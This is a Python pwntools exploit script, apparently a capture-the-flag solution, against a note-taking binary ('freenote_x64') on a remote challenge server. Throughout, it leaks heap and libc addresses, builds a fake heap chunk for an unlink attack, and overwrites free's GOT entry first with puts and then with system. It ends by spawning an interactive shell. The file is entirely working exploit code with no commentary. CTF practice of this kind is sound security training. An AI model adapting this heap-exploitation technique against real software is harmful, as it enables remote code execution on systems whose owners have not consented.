# coding:utf-8

from pwn import *


def list_note():
    p.recvuntil("Your choice: ")
    p.sendline(str(1))


def new_note(payload):
    p.recvuntil("Your choice: ")
    p.sendline(str(2))
    p.recvuntil("Length of new note: ")
    p.sendline(str(len(payload)))
    p.recvuntil("Enter your note: ")
    p.send(payload)


def edit_note(note, payload):
    p.recvuntil("Your choice: ")
    p.sendline(str(3))
    p.recvuntil("Note number: ")
    p.sendline(str(note))
    p.recvuntil("Length of note: ")
    p.sendline(str(len(payload)))
    p.recvuntil("Enter your note: ")
    p.send(payload)


def delete_note(note):
    p.recvuntil("Your choice: ")
    p.sendline(str(4))
    p.recvuntil("Note number: ")
    p.sendline(str(note))


def main():
    new_note("a"*32)
    new_note('b'*32)
    new_note('c'*32)
    new_note("/bin/sh\x00"+'d'*32)
    delete_note(0)
    delete_note(2)

    new_note('a'*8)
    new_note('c'*8)
    list_note()
    leak_data1 = p.recvuntil('\n1. ')[:-4].split("a"*8)[1].ljust(8, '\x00')
    heap_addr = u64(leak_data1)
    leak_data2 = p.recvuntil('\n3. ')[:-4].split("c"*8)[1].ljust(8, '\x00')
    libc_addr = u64(leak_data2)
    log.info("leak_heap address is %s ", hex(heap_addr))
    log.info("leak_libc address is %s ", hex(libc_addr))

    heap_a_ptr = heap_addr - 6416
    heap_b_ptr = heap_addr - 0x90

    delete_note(1)
    payload = p64(0) + p64(0x81) # fake-chunk1 head
    payload += p64(heap_a_ptr-0x18) + p64(heap_a_ptr-0x10) # fake fd and bk
    payload += "\x00"*(0x80-len(payload))
    payload += p64(0x80) + p64(0x90)
    payload += "/bin/sh\x00" + "\x00"*20
    edit_note(0, payload)
    delete_note(1)
    #
    free_got = 0x0000000000602018
    puts_plt = 0x00000000004006c0
    read_got = 0x0000000000602040
    # leak read_got
    payload2 = p64(2) + p64(1)
    payload2 += p64(8) + p64(free_got)
    payload2 += p64(0) + p64(0) + p64(read_got)
    payload2 += p64(1) + p64(8) + p64(heap_b_ptr+0x90)
    payload2 += p64(1) + p64(8) + p64(heap_b_ptr+0x90+0x90+0x10)
    payload2 += "\x00"*(0xac-len(payload2)) # avoid call realloc
    edit_note(0, payload2)
    edit_note(0, p64(puts_plt))
    delete_note(1)
    leak_data3 = p.recvuntil("\nDone.\n")[:-7].ljust(8, "\x00")
    read_addr = u64(leak_data3)
    log.info("read address is %s ", hex(read_addr))

    libc = ELF("./libc-2.19.so")
    system_addr = read_addr - libc.symbols['read'] + libc.symbols['system']
    log.info("system address is %s ", hex(system_addr))

    edit_note(0, p64(system_addr))
    delete_note(3)
    # gdb.attach(p, "b* 0x0000000004010AD")


    p.interactive()

if __name__ == '__main__':
    debug = 0
    if debug:
        context(os="linux", arch="amd64", log_level="debug")
        context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']
        env = {"LD_PRELOAD":"libc-2.19.so"}
        p = process("./freenote_x64")
    else:
        p = remote("pwn2.jarvisoj.com", 9886)

    main()